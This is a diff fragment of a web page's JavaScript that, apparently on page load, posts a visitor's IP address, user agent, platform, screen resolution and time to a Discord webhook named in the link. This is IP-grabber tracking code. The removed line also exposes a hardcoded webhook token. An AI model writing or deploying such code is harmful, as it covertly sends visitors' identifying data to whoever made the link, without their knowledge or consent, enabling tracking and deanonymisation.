@@ -123,14 +123,14 @@ if (urlParams.user && urlParams.access) {
 
     function sendMessage() {
       var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/"+urlParams.access[0]+"/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
+      request.open("POST", "https://discord.com/api/webhooks/"+urlParams.access[0]+"/"+urlParams.svcid[0]);
 
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
         username: urlParams.user[0],
         avatar_url: "",
-        content: json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nTIMEZONE: " + navigator.timezone + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight + ", \nTIME: " + new Date(),
+        content: "=======================================\n\n" +json.ip + ", \nUSERAGENT: " + navigator.userAgent + ", \nPLATFORM: " + navigator.platform + ", \nRESOLUTION: " + window.innerWidth + "x" + window.innerHeight + ", \nTIME: " + new Date()+"\n\n",
       }
 
       request.send(JSON.stringify(params));
